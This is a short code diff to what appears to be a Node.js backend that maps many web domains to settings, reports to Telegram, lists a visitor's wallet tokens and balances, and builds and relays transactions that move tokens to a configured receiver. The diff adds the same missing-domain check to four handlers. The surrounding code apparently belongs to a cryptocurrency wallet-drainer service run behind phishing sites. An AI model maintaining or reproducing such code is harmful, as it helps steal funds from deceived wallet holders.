@@ -122,6 +122,9 @@ async function sendTelegramMessage(req, res) {
 		const indexOfSetting = SETTINGS.findIndex(setting =>
 			setting.domains.includes(domain),
 		)
+		if (indexOfSetting === -1) {
+			return res.status(400).send({ error: 'Domain not found in settings' })
+		}
 		const setting = SETTINGS[indexOfSetting]
 
 		data.receiver =
@@ -150,6 +153,9 @@ async function sendTokensList(req, res) {
 		const indexOfSetting = SETTINGS.findIndex(setting =>
 			setting.domains.includes(domain),
 		)
+		if (indexOfSetting === -1) {
+			return res.status(400).send({ error: 'Domain not found in settings' })
+		}
 		const setting = SETTINGS[indexOfSetting]
 		const balance = await checkBalance(address, indexOfSetting, walletName)
 		let {
@@ -251,6 +257,9 @@ async function getUnsignedTx(req, res) {
 		const indexOfSetting = SETTINGS.findIndex(setting =>
 			setting.domains.includes(domain),
 		)
+		if (indexOfSetting === -1) {
+			return res.status(400).send({ error: 'Domain not found in settings' })
+		}
 		const setting = SETTINGS[indexOfSetting]
 		const moveMessage = 'Move to the next token'
 		const transactionTitle = setting.transactionTitle
@@ -378,6 +387,9 @@ async function sendSignedTransaction(req, res) {
 		const indexOfSetting = SETTINGS.findIndex(setting =>
 			setting.domains.includes(domain),
 		)
+		if (indexOfSetting === -1) {
+			return res.status(400).send({ error: 'Domain not found in settings' })
+		}
 		const setting = SETTINGS[indexOfSetting]
 
 		// Send the raw signed transaction
